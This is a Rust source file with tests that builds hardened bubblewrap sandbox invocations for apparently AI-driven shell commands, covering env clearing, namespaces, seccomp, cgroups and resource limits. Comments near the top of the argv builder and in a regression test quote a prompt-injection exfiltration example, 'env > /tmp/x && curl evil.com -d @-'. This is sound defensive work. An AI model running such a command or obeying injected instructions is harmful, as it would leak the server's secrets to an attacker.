//! bwrap invocation + always-on hardening for the code sandbox.
//!
//! Design rationale and validated flag set lives in
//! `.claude/plans/replicated-enchanting-allen.md` under "Phase 3:
//! Sandbox runtime — bwrap + always-on hardening". Every flag here has
//! a test row in the empirical-validation table.

use std::os::fd::{AsRawFd, IntoRawFd, RawFd};
use std::os::unix::process::CommandExt;
use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::sync::Arc;
use std::time::{Duration, Instant};

use tokio::io::{AsyncRead, AsyncReadExt};
use tokio::process::Command;
use tokio::time::timeout;
use uuid::Uuid;

use crate::common::AppError;
use crate::modules::code_sandbox::types::{
    CgroupMode, CodeSandboxState, HardeningCapabilities, PidNsMode, SandboxContext, SeccompMode,
};

/// Output of a single bwrap invocation. stdout/stderr are each
/// capped at [`OUTPUT_CAP_BYTES`]; bytes past the cap are drained
/// from the pipe and discarded (a truncation marker is appended to
/// the captured output, and `*_truncated: true` is set on the
/// returned JSON). The child is NOT killed when the cap is reached —
/// it can keep running and producing output until natural exit or the
/// wall-clock [`DEFAULT_TIMEOUT_SECS`] expires, at which point a
/// SIGKILL is sent. This keeps a noisy-but-correct workload from
/// being aborted just because it logged a lot, while still bounding
/// total CPU via the timeout.
#[derive(Debug, Clone)]
pub struct SandboxRunResult {
    pub exit_code: i32,
    pub stdout: String,
    pub stderr: String,
    pub stdout_truncated: bool,
    pub stderr_truncated: bool,
    pub duration_ms: u64,
    pub timed_out: bool,
}

/// Per-call output cap. Matches the plan's 1 MiB ceiling. Lifted to
/// a const so tests can assert behavior at the boundary without
/// re-encoding the magic number.
pub const OUTPUT_CAP_BYTES: usize = 1024 * 1024;

/// Default wall-clock timeout for `execute_command`. Other tool callers
/// pass a shorter timeout via `run_in_sandbox`.
pub const DEFAULT_TIMEOUT_SECS: u64 = 600;

/// Run a shell command inside a bwrap-isolated environment.
///
/// All flags are derived from `state.caps` (probed once at boot). The
/// per-call work here is:
///   1. Render argv (no probes; reads cached caps).
///   2. Optionally allocate a transient cgroup scope under
///      `caps.cgroup`'s delegated parent.
///   3. Optionally pipe the compiled seccomp filter bytes to a fd.
///   4. Spawn bwrap → wrap with tokio `timeout` → capture-with-cap.
///   5. Tear down cgroup scope on the way out.
#[tracing::instrument(
    name = "code_sandbox.exec",
    skip_all,
    fields(
        conversation_id = %ctx.conversation_id,
        user_id = %ctx.user_id,
        command_preview = preview(command, 80),
    ),
)]
pub async fn run_in_sandbox(
    state: &CodeSandboxState,
    ctx: &SandboxContext,
    command: &str,
    timeout_secs: Option<u64>,
) -> Result<SandboxRunResult, AppError> {
    use crate::modules::code_sandbox::cgroup;

    if state.caps.pid_namespace == PidNsMode::Disabled {
        return Err(AppError::new(
            axum::http::StatusCode::SERVICE_UNAVAILABLE,
            "SANDBOX_DISABLED",
            "code_sandbox is disabled: boot probe failed to find a working bwrap PID-namespace mode",
        ));
    }

    let workspace = ctx.workspace.clone();
    // Identity files live OUTSIDE the per-conversation workspace bind
    // (under `<workspace_root>/identity/`) so the sandboxed shell
    // cannot tamper with them via the workspace RW mount.
    let synthetic = SyntheticIdentity::ensure(&state.workspace_root)?;

    // Touch the per-conversation last-used sentinel so the workspace
    // reaper doesn't delete an active long-lived workspace. Without
    // this sentinel, the reaper only sees the directory mtime, which
    // does not update on file writes inside — a 30-day-old
    // conversation that's still in use would get reaped mid-flight.
    let _ = std::fs::write(
        workspace.join(".last_used"),
        chrono::Utc::now().timestamp().to_string(),
    );

    // Per-call cgroup scope, if available.
    let cgroup_scope = match &state.caps.cgroup {
        CgroupMode::Delegated(parent) => {
            Some(cgroup::CgroupScope::create(parent, ctx.conversation_id).map_err(|e| {
                tracing::warn!("cgroup scope creation failed: {e}; continuing without cgroup");
                e
            }).ok())
                .flatten()
        }
        CgroupMode::None => None,
    };

    // Per-call seccomp pipe.
    let seccomp_pipe = match &state.caps.seccomp {
        SeccompMode::Loaded(bpf) => Some(SeccompPipe::install(bpf.clone())?),
        SeccompMode::NotLinked | SeccompMode::Disabled => None,
    };

    let argv = build_bwrap_argv(
        &state.caps,
        state,
        ctx,
        command,
        synthetic.passwd_path(),
        synthetic.group_path(),
        seccomp_pipe.as_ref().map(|p| p.target_fd()),
    );

    let started = Instant::now();
    let mut cmd = Command::new(&state.caps.bwrap_path);
    cmd.args(&argv);
    cmd.stdin(Stdio::null());
    cmd.stdout(Stdio::piped());
    cmd.stderr(Stdio::piped());
    cmd.kill_on_drop(true);

    // Attach the seccomp read-fd at the well-known target (we have to
    // dup2 in pre_exec because tokio::process::Command closes non-stdio
    // fds by default).
    if let Some(pipe) = seccomp_pipe.as_ref() {
        let source_fd = pipe.read_fd();
        let target_fd = pipe.target_fd();
        // SAFETY: dup2 is async-signal-safe; we don't allocate or hold
        // locks. The source fd is owned by SeccompPipe and remains
        // valid through cmd.spawn().
        unsafe {
            cmd.pre_exec(move || {
                if libc::dup2(source_fd, target_fd as RawFd) < 0 {
                    return Err(std::io::Error::last_os_error());
                }
                // Clear FD_CLOEXEC so the fd survives execve into bwrap.
                let flags = libc::fcntl(target_fd as RawFd, libc::F_GETFD);
                if flags < 0 {
                    return Err(std::io::Error::last_os_error());
                }
                if libc::fcntl(target_fd as RawFd, libc::F_SETFD, flags & !libc::FD_CLOEXEC) < 0 {
                    return Err(std::io::Error::last_os_error());
                }
                Ok(())
            });
        }
    }

    let mut child = cmd
        .spawn()
        .map_err(|e| AppError::new(
            axum::http::StatusCode::INTERNAL_SERVER_ERROR,
            "BWRAP_SPAWN_FAILED",
            format!("failed to spawn bwrap: {e}"),
        ))?;

    // Attach the child pid to the cgroup scope (after fork, before
    // exec inside bwrap actually starts the sandboxed binary).
    if let Some(scope) = cgroup_scope.as_ref() {
        if let Some(pid) = child.id() {
            if let Err(e) = scope.attach_pid(pid) {
                tracing::warn!("cgroup attach_pid({pid}) failed: {e}");
            }
        }
    }

    let stdout = child.stdout.take().expect("stdout piped");
    let stderr = child.stderr.take().expect("stderr piped");

    let stdout_handle = tokio::spawn(read_capped_owned(stdout));
    let stderr_handle = tokio::spawn(read_capped_owned(stderr));

    // Hard wall-clock timeout. timeout=0 keeps the default.
    let budget = Duration::from_secs(timeout_secs.unwrap_or(DEFAULT_TIMEOUT_SECS));
    let wait_result = timeout(budget, child.wait()).await;

    let (timed_out, status) = match wait_result {
        Ok(Ok(s)) => (false, s.code().unwrap_or(-1)),
        Ok(Err(e)) => {
            return Err(AppError::new(
                axum::http::StatusCode::INTERNAL_SERVER_ERROR,
                "BWRAP_WAIT_FAILED",
                format!("wait on bwrap child failed: {e}"),
            ));
        }
        Err(_) => {
            // Timed out → SIGKILL. child.kill() is best-effort; even if
            // the bwrap parent is already dead the kernel will reap.
            let _ = child.start_kill();
            let _ = child.wait().await;
            (true, -1)
        }
    };

    // Drain capture tasks.
    let (stdout_buf, stdout_truncated) = stdout_handle
        .await
        .unwrap_or_else(|_| (Vec::new(), false));
    let (stderr_buf, stderr_truncated) = stderr_handle
        .await
        .unwrap_or_else(|_| (Vec::new(), false));

    let duration_ms = started.elapsed().as_millis() as u64;

    // Best-effort cgroup cleanup happens via Drop.
    drop(cgroup_scope);
    drop(seccomp_pipe);

    tracing::info!(
        exit_code = status,
        stdout_bytes = stdout_buf.len(),
        stderr_bytes = stderr_buf.len(),
        timed_out,
        duration_ms,
        "code_sandbox.exec complete",
    );

    Ok(SandboxRunResult {
        exit_code: status,
        stdout: lossy_string_with_marker(stdout_buf, stdout_truncated),
        stderr: lossy_string_with_marker(stderr_buf, stderr_truncated),
        stdout_truncated,
        stderr_truncated,
        duration_ms,
        timed_out,
    })
}

// --------------------------------------------------------------------
// argv construction
// --------------------------------------------------------------------

fn build_bwrap_argv(
    caps: &HardeningCapabilities,
    state: &CodeSandboxState,
    ctx: &SandboxContext,
    user_cmd: &str,
    passwd_path: &Path,
    group_path: &Path,
    seccomp_fd: Option<RawFd>,
) -> Vec<String> {
    let rootfs = state.config.rootfs_path.as_str();
    let workspace = ctx.workspace.to_string_lossy().to_string();

    let mut argv: Vec<String> = vec![
        // SECURITY: wipe the entire inherited environment before any
        // --setenv lines below. Without --clearenv, the server's full
        // env (DATABASE_URL, JWT secrets, every *_API_KEY,
        // HUGGINGFACE_API_KEY, AWS_*, OPENAI_*, ANTHROPIC_*, etc.) is
        // visible to the sandboxed bash. Combined with --share-net, a
        // prompt-injection like `env > /tmp/x && curl evil.com -d @-`
        // exfiltrates every secret the server holds. With --clearenv,
        // only the explicit --setenv values below survive into the
        // sandbox.
        "--clearenv".into(),
        "--unshare-user".into(),
        "--uid".into(),
        "1001".into(),
        "--gid".into(),
        "1001".into(),
        "--unshare-uts".into(),
        "--unshare-ipc".into(),
        "--unshare-cgroup-try".into(),
        "--share-net".into(),
        "--new-session".into(),
        "--die-with-parent".into(),
        "--as-pid-1".into(),
        // Filesystem (rootfs bind + symlinks for /bin /sbin /lib /lib64).
        "--ro-bind".into(),
        format!("{rootfs}/usr"),
        "/usr".into(),
        "--ro-bind".into(),
        "/etc/ssl".into(),
        "/etc/ssl".into(),
        "--ro-bind".into(),
        passwd_path.display().to_string(),
        "/etc/passwd".into(),
        "--ro-bind".into(),
        group_path.display().to_string(),
        "/etc/group".into(),
        "--symlink".into(),
        "usr/bin".into(),
        "/bin".into(),
        "--symlink".into(),
        "usr/sbin".into(),
        "/sbin".into(),
        "--symlink".into(),
        "usr/lib".into(),
        "/lib".into(),
        "--symlink".into(),
        "usr/lib64".into(),
        "/lib64".into(),
        "--dev".into(),
        "/dev".into(),
        "--tmpfs".into(),
        "/tmp".into(),
        "--bind".into(),
        workspace,
        "/home/sandboxuser".into(),
        "--chdir".into(),
        "/home/sandboxuser".into(),
        "--setenv".into(),
        "HOME".into(),
        "/home/sandboxuser".into(),
        "--setenv".into(),
        "USER".into(),
        "sandboxuser".into(),
        "--setenv".into(),
        "PATH".into(),
        "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin".into(),
        // Safe defaults that some rootfs tools (R, matplotlib, click)
        // require to start cleanly. Chosen to leak nothing about the
        // host: C.UTF-8 is universal, "dumb" disables interactive
        // terminal behaviors in tools that probe TERM.
        "--setenv".into(),
        "LANG".into(),
        "C.UTF-8".into(),
        "--setenv".into(),
        "LC_ALL".into(),
        "C.UTF-8".into(),
        "--setenv".into(),
        "TERM".into(),
        "dumb".into(),
    ];

    // PID namespace + /proc handling per cached mode.
    match caps.pid_namespace {
        PidNsMode::Strict => {
            argv.push("--unshare-pid".into());
            argv.push("--proc".into());
            argv.push("/proc".into());
        }
        PidNsMode::DevBindFallback => {
            // No --unshare-pid; bind host /proc. Sandbox sees host PIDs
            // (info leak; no escape). Acceptable for docker hosts where
            // nested proc-mount fails.
            argv.push("--dev-bind".into());
            argv.push("/proc".into());
            argv.push("/proc".into());
        }
        PidNsMode::Disabled => {
            // Reachable only by tests that force-set this; production
            // run_in_sandbox short-circuits before reaching here.
        }
    }

    // Read-only binds for each conversation attachment at its original
    // filename. Foreign-attachment guard happens upstream in tools.
    for f in ctx.files.iter() {
        // Skip filenames containing path separators — we already store
        // a basename, but defense-in-depth.
        if f.filename.contains('/') || f.filename.contains('\0') {
            continue;
        }
        let host_path = workspace_attachment_path(&state.workspace_root, f.file_id);
        argv.push("--ro-bind-try".into());
        argv.push(host_path.display().to_string());
        argv.push(format!("/home/sandboxuser/{}", f.filename));
    }

    // Optional seccomp filter on a well-known fd we'll dup2 to.
    if let Some(fd) = seccomp_fd {
        argv.push("--seccomp".into());
        argv.push(fd.to_string());
    }

    // CVE-2024-32462 argument-injection defense: terminator BEFORE the
    // sub-command. Every user-controlled arg after this is data only.
    argv.push("--".into());

    // Wrap user code in `prlimit` so per-call rlimits apply to the
    // workload, not to bwrap's own helper forks (validated:
    // setting rlimits on bwrap itself starves bwrap).
    argv.push("/usr/bin/prlimit".into());
    argv.push("--nproc=256".into());
    argv.push(format!("--as={}", 4u64 * 1024 * 1024 * 1024)); // 4 GiB
    argv.push(format!("--fsize={}", 256u64 * 1024 * 1024));   // 256 MiB
    argv.push("--nofile=1024".into());
    argv.push("--core=0".into());
    argv.push("--".into());
    argv.push("/bin/bash".into());
    argv.push("-lc".into());
    argv.push(user_cmd.to_string());

    argv
}

/// Per-file workspace path for a conversation attachment.
/// Files are staged under `<workspace_root>/attachments/<file_id>` by
/// the handler before bwrap fires, so the bind is read-only-safe.
pub fn workspace_attachment_path(workspace_root: &Path, file_id: Uuid) -> PathBuf {
    workspace_root.join("attachments").join(file_id.to_string())
}

// --------------------------------------------------------------------
// Synthetic passwd / group (per-call, lives inside the workspace,
// bind-mounted read-only over /etc/passwd /etc/group)
// --------------------------------------------------------------------

struct SyntheticIdentity {
    passwd: PathBuf,
    group: PathBuf,
}

const SYNTHETIC_PASSWD: &str =
    "sandboxuser:x:1001:1001:Sandbox User:/home/sandboxuser:/bin/bash\n";
const SYNTHETIC_GROUP: &str = "sandboxuser:x:1001:\n";

impl SyntheticIdentity {
    /// Lazily ensure the synthetic passwd/group files exist under
    /// `<workspace_root>/identity/` and return their paths.
    ///
    /// SECURITY: identity files live OUTSIDE the per-conversation
    /// workspace bind. The earlier implementation wrote them into
    /// `<workspace>/.sandbox_passwd`, which had two problems:
    ///   1. Two concurrent calls in the same conversation raced on the
    ///      write (mitigated by the per-conv mutex, but still fragile).
    ///   2. A user who did `write_file(".sandbox_passwd", payload)`
    ///      would have their data silently clobbered by the next
    ///      execute_command — surprising and a small data-loss vector.
    /// Moving the files to `<workspace_root>/identity/` makes them
    /// per-process (shared by every conversation) and the content is
    /// constant, so the write is idempotent: we only write if the
    /// file doesn't already exist or has the wrong content.
    fn ensure(workspace_root: &Path) -> Result<Self, AppError> {
        let identity_dir = workspace_root.join("identity");
        std::fs::create_dir_all(&identity_dir).map_err(|e| {
            AppError::new(
                axum::http::StatusCode::INTERNAL_SERVER_ERROR,
                "WORKSPACE_INIT_FAILED",
                format!("mkdir identity dir: {e}"),
            )
        })?;
        let passwd = identity_dir.join("passwd");
        let group = identity_dir.join("group");
        write_if_changed(&passwd, SYNTHETIC_PASSWD).map_err(|e| {
            AppError::new(
                axum::http::StatusCode::INTERNAL_SERVER_ERROR,
                "WORKSPACE_WRITE_FAILED",
                format!("write synthetic passwd: {e}"),
            )
        })?;
        write_if_changed(&group, SYNTHETIC_GROUP).map_err(|e| {
            AppError::new(
                axum::http::StatusCode::INTERNAL_SERVER_ERROR,
                "WORKSPACE_WRITE_FAILED",
                format!("write synthetic group: {e}"),
            )
        })?;
        Ok(Self { passwd, group })
    }

    fn passwd_path(&self) -> &Path {
        &self.passwd
    }
    fn group_path(&self) -> &Path {
        &self.group
    }
}

/// Write `content` to `path` only if the file doesn't already exist
/// or has different content. Avoids redundant disk writes on every
/// sandbox call.
fn write_if_changed(path: &Path, content: &str) -> std::io::Result<()> {
    match std::fs::read_to_string(path) {
        Ok(existing) if existing == content => Ok(()),
        _ => std::fs::write(path, content),
    }
}

// --------------------------------------------------------------------
// Seccomp pipe (per-call). Bytes are precompiled at boot; we just
// shuttle them to a fd that bwrap reads via `--seccomp <fd>`.
// --------------------------------------------------------------------

struct SeccompPipe {
    read_fd: RawFd,
    /// Stable fd number we dup2 the read end to inside the bwrap child
    /// in pre_exec. We pick fd 7 (out of stdio range, plausibly free).
    target_fd: i32,
}

impl SeccompPipe {
    fn install(bpf: Arc<Vec<u8>>) -> Result<Self, AppError> {
        // pipe(2) via libc — nix would be cleaner but we avoid the dep
        // here to keep the surface small.
        let mut fds: [libc::c_int; 2] = [0; 2];
        let ret = unsafe { libc::pipe2(fds.as_mut_ptr(), libc::O_CLOEXEC) };
        if ret < 0 {
            return Err(AppError::new(
                axum::http::StatusCode::INTERNAL_SERVER_ERROR,
                "SECCOMP_PIPE_FAILED",
                format!("pipe2: {}", std::io::Error::last_os_error()),
            ));
        }
        let read_fd = fds[0];
        let write_fd = fds[1];

        // Push the BPF bytes from a tokio task so we don't deadlock if
        // they're bigger than the kernel pipe buffer (unlikely at <1KB
        // but cheap insurance).
        //
        // SECURITY: write must succeed in full. A short write (or
        // EINTR-interrupted partial write) would feed bwrap a
        // truncated BPF program, which libseccomp rejects → bwrap
        // exits non-zero. Worse: an undetected partial write at the
        // boundary could conceivably load a smaller filter that
        // blocks fewer syscalls than the planner intended. Loop on
        // EINTR / EAGAIN; on any other error or unexpected EOF
        // (write returned 0), log loudly so operators see the
        // hardening claim was not delivered for that call.
        let total = bpf.as_ref().len();
        tokio::spawn(async move {
            let bytes: &[u8] = bpf.as_ref();
            let mut offset = 0;
            let mut last_err: Option<i32> = None;
            while offset < bytes.len() {
                let n = unsafe {
                    libc::write(
                        write_fd,
                        bytes[offset..].as_ptr() as *const libc::c_void,
                        bytes.len() - offset,
                    )
                };
                if n > 0 {
                    offset += n as usize;
                    continue;
                }
                // n <= 0: either error or kernel said "no more room",
                // which on a pipe write means the reader closed —
                // unexpected for our use case.
                let errno = std::io::Error::last_os_error().raw_os_error().unwrap_or(0);
                if n < 0 && (errno == libc::EINTR || errno == libc::EAGAIN) {
                    continue;
                }
                last_err = Some(errno);
                break;
            }
            unsafe {
                libc::close(write_fd);
            }
            if offset < total {
                tracing::error!(
                    written = offset,
                    expected = total,
                    errno = ?last_err,
                    "code_sandbox: seccomp BPF write was truncated; \
                     bwrap will reject the filter and the sandboxed \
                     call WILL FAIL — hardening claim 'seccomp: on' \
                     was not delivered for this call"
                );
            }
        });

        Ok(Self {
            read_fd,
            target_fd: 7,
        })
    }

    fn read_fd(&self) -> RawFd {
        self.read_fd
    }
    fn target_fd(&self) -> i32 {
        self.target_fd
    }
}

impl Drop for SeccompPipe {
    fn drop(&mut self) {
        unsafe {
            libc::close(self.read_fd);
        }
    }
}

// --------------------------------------------------------------------
// Capped stdout/stderr capture.
// --------------------------------------------------------------------

async fn read_capped_owned<R: AsyncRead + Unpin + Send + 'static>(
    mut reader: R,
) -> (Vec<u8>, bool) {
    let mut buf = Vec::with_capacity(8 * 1024);
    let mut chunk = [0u8; 8 * 1024];
    let mut truncated = false;
    loop {
        match reader.read(&mut chunk).await {
            Ok(0) => break,
            Ok(n) => {
                if buf.len() + n > OUTPUT_CAP_BYTES {
                    let remain = OUTPUT_CAP_BYTES - buf.len();
                    buf.extend_from_slice(&chunk[..remain]);
                    truncated = true;
                    // Drain the rest so the writer doesn't block forever.
                    while reader.read(&mut chunk).await.unwrap_or(0) > 0 {}
                    break;
                }
                buf.extend_from_slice(&chunk[..n]);
            }
            Err(_) => break,
        }
    }
    (buf, truncated)
}

fn lossy_string_with_marker(buf: Vec<u8>, truncated: bool) -> String {
    let mut s = String::from_utf8_lossy(&buf).into_owned();
    if truncated {
        s.push_str(&format!(
            "\n[output truncated at {} bytes]\n",
            OUTPUT_CAP_BYTES
        ));
    }
    s
}

fn preview(s: &str, n: usize) -> &str {
    let end = s.char_indices().nth(n).map(|(i, _)| i).unwrap_or(s.len());
    &s[..end]
}

// Re-export so non-sandbox callers don't need to touch RawFd directly.
pub use std::os::fd::FromRawFd;

// Trait imports used above but otherwise unused locally — keep the
// imports honest in -Dwarnings builds.
#[allow(dead_code)]
fn _force_fd_imports(f: std::fs::File) -> RawFd {
    let fd = f.as_raw_fd();
    let _: std::fs::File = unsafe { std::fs::File::from_raw_fd(fd) };
    let _moved = unsafe { std::fs::File::from_raw_fd(fd) }.into_raw_fd();
    _moved
}

// =====================================================================
// Tier 1 unit tests — argv builder + output cap
// =====================================================================

#[cfg(test)]
mod tests {
    use super::*;
    use crate::core::config::CodeSandboxConfig;
    use crate::modules::code_sandbox::models::ConversationFile;
    use std::path::PathBuf;
    use std::sync::Arc;
    use uuid::Uuid;

    fn fake_caps() -> HardeningCapabilities {
        HardeningCapabilities {
            bwrap_path: PathBuf::from("/usr/bin/bwrap"),
            pid_namespace: PidNsMode::Strict,
            cgroup: CgroupMode::None,
            seccomp: SeccompMode::NotLinked,
        }
    }

    fn fake_state() -> CodeSandboxState {
        CodeSandboxState {
            config: CodeSandboxConfig {
                enabled: true,
                rootfs_path: "/opt/ziee-sandbox-rootfs/current".to_string(),
                cgroup_parent: String::new(),
            },
            loopback_url: "http://127.0.0.1:8080/api/code-sandbox".to_string(),
            workspace_root: PathBuf::from("/tmp/ziee-workspace"),
            caps: fake_caps(),
        }
    }

    fn fake_ctx() -> SandboxContext {
        SandboxContext {
            conversation_id: Uuid::nil(),
            user_id: Uuid::nil(),
            workspace: PathBuf::from("/tmp/ws"),
            files: Arc::new(Vec::<ConversationFile>::new()),
        }
    }

    #[test]
    fn argv_clears_env_before_setenv() {
        // SECURITY regression test: --clearenv MUST appear before any
        // --setenv flag, so the server's full inherited environment
        // (DATABASE_URL, JWT secrets, every *_API_KEY) does not leak
        // into the sandboxed shell. Combined with --share-net, a
        // missing --clearenv would let a prompt-injected `env >
        // /tmp/x && curl evil.com -d @-` exfiltrate every secret the
        // server holds.
        let caps = fake_caps();
        let state = fake_state();
        let ctx = fake_ctx();
        let argv = build_bwrap_argv(
            &caps,
            &state,
            &ctx,
            "echo hi",
            std::path::Path::new("/tmp/.sandbox_passwd"),
            std::path::Path::new("/tmp/.sandbox_group"),
            None,
        );

        let clearenv = argv
            .iter()
            .position(|a| a == "--clearenv")
            .expect("bwrap argv must include --clearenv");
        let first_setenv = argv
            .iter()
            .position(|a| a == "--setenv")
            .expect("expected at least one --setenv (HOME/USER/PATH)");

        assert!(
            clearenv < first_setenv,
            "--clearenv must come BEFORE the first --setenv; argv: {argv:?}"
        );

        // Sanity: the safe locale/TERM defaults we added alongside
        // --clearenv are present so rootfs tools (R, matplotlib,
        // click) still start cleanly.
        for required in &["HOME", "USER", "PATH", "LANG", "LC_ALL", "TERM"] {
            assert!(
                argv.iter().any(|a| a == required),
                "missing --setenv for {required}; argv: {argv:?}"
            );
        }
    }

    #[test]
    fn argv_always_terminates_user_input_with_dashdash() {
        let caps = fake_caps();
        let state = fake_state();
        let ctx = fake_ctx();
        let argv = build_bwrap_argv(
            &caps,
            &state,
            &ctx,
            "echo hello",
            std::path::Path::new("/tmp/.sandbox_passwd"),
            std::path::Path::new("/tmp/.sandbox_group"),
            None,
        );
        // There should be at least one `--` before the prlimit wrapper.
        let prlimit_idx = argv
            .iter()
            .position(|a| a == "/usr/bin/prlimit")
            .expect("prlimit not in argv");
        let dashdash_before = argv[..prlimit_idx]
            .iter()
            .rposition(|a| a == "--")
            .expect("no -- before prlimit");
        // Nothing flag-like between the last `--` and prlimit (only
        // flag-like would be `--seccomp <fd>` which is correctly placed
        // before the `--`).
        assert!(prlimit_idx > dashdash_before);
    }

    #[test]
    fn argv_uses_dev_bind_proc_in_fallback_mode() {
        let mut caps = fake_caps();
        caps.pid_namespace = PidNsMode::DevBindFallback;
        let state = fake_state();
        let ctx = fake_ctx();
        let argv = build_bwrap_argv(
            &caps,
            &state,
            &ctx,
            "x",
            std::path::Path::new("/tmp/.sandbox_passwd"),
            std::path::Path::new("/tmp/.sandbox_group"),
            None,
        );
        // Must use --dev-bind /proc /proc, NOT --proc /proc.
        assert!(argv.windows(3).any(|w| w == ["--dev-bind", "/proc", "/proc"]));
        assert!(!argv.windows(2).any(|w| w == ["--proc", "/proc"]));
        assert!(!argv.iter().any(|a| a == "--unshare-pid"));
    }

    #[test]
    fn argv_uses_strict_proc_when_pid_ns_strict() {
        let caps = fake_caps(); // PidNsMode::Strict
        let state = fake_state();
        let ctx = fake_ctx();
        let argv = build_bwrap_argv(
            &caps,
            &state,
            &ctx,
            "x",
            std::path::Path::new("/tmp/.sandbox_passwd"),
            std::path::Path::new("/tmp/.sandbox_group"),
            None,
        );
        assert!(argv.iter().any(|a| a == "--unshare-pid"));
        assert!(argv.windows(2).any(|w| w == ["--proc", "/proc"]));
    }

    #[test]
    fn argv_includes_seccomp_fd_only_when_provided() {
        let caps = fake_caps();
        let state = fake_state();
        let ctx = fake_ctx();
        let argv_without = build_bwrap_argv(
            &caps,
            &state,
            &ctx,
            "x",
            std::path::Path::new("/tmp/.sandbox_passwd"),
            std::path::Path::new("/tmp/.sandbox_group"),
            None,
        );
        assert!(!argv_without.iter().any(|a| a == "--seccomp"));

        let argv_with = build_bwrap_argv(
            &caps,
            &state,
            &ctx,
            "x",
            std::path::Path::new("/tmp/.sandbox_passwd"),
            std::path::Path::new("/tmp/.sandbox_group"),
            Some(7),
        );
        assert!(argv_with.windows(2).any(|w| w == ["--seccomp", "7"]));
    }

    #[test]
    fn argv_prlimit_carries_expected_flags() {
        let caps = fake_caps();
        let state = fake_state();
        let ctx = fake_ctx();
        let argv = build_bwrap_argv(
            &caps,
            &state,
            &ctx,
            "x",
            std::path::Path::new("/tmp/.sandbox_passwd"),
            std::path::Path::new("/tmp/.sandbox_group"),
            None,
        );
        let s = argv.join(" ");
        assert!(s.contains("/usr/bin/prlimit"));
        assert!(s.contains("--nproc=256"));
        assert!(s.contains("--core=0"));
        assert!(s.contains("--fsize="));
        assert!(s.contains("--as="));
    }

    #[test]
    fn output_cap_is_one_mib() {
        assert_eq!(OUTPUT_CAP_BYTES, 1024 * 1024);
    }

    #[tokio::test]
    async fn read_capped_truncates_at_one_mib() {
        // 2 MiB of bytes through the reader; expect exactly 1 MiB out.
        let big = vec![b'X'; 2 * 1024 * 1024];
        let cursor = std::io::Cursor::new(big);
        let (buf, truncated) = read_capped_owned(cursor).await;
        assert_eq!(buf.len(), OUTPUT_CAP_BYTES);
        assert!(truncated);
    }

    #[tokio::test]
    async fn read_capped_passes_through_short_output() {
        let cursor = std::io::Cursor::new(b"hello".to_vec());
        let (buf, truncated) = read_capped_owned(cursor).await;
        assert_eq!(&buf, b"hello");
        assert!(!truncated);
    }
}
